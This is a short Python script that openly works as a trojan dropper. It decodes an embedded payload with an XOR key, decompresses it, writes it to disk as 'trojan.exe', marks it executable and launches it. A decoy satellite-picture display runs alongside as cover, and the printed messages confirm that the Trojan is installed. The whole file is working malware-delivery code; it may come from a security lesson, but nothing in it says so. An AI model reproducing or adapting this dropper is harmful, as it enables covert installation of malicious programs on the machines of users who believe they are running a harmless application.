import os
import stat
import gzip
import subprocess
import satellite

target_dir = os.path.join(os.getcwd(), 'payload')

def unpack_trojan(trojan_enc, exeName):
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
    exeFile    = os.path.join(target_dir, exeName)
    trojan_gz  = bytes([i ^ 0x44 for i in trojan_enc])
    trojan_exe = gzip.decompress(trojan_gz)
    with open(exeFile, 'wb') as fp:
        fp.write(trojan_exe)
    os.chmod(exeFile, stat.S_IRWXU)
    return exeFile

def start_game():
    try:
        satellite.show_satellite()
        print('Display picture successfully, Trojan installed, too.')
    except:
        print('Display picture failed, but Trojan installed successfully.')

if __name__ == '__main__':
    import dropper.trojan_exe as trojan
    exeFile = unpack_trojan(trojan.gzipped, 'trojan.exe')
    subprocess.Popen(exeFile)
    start_game()
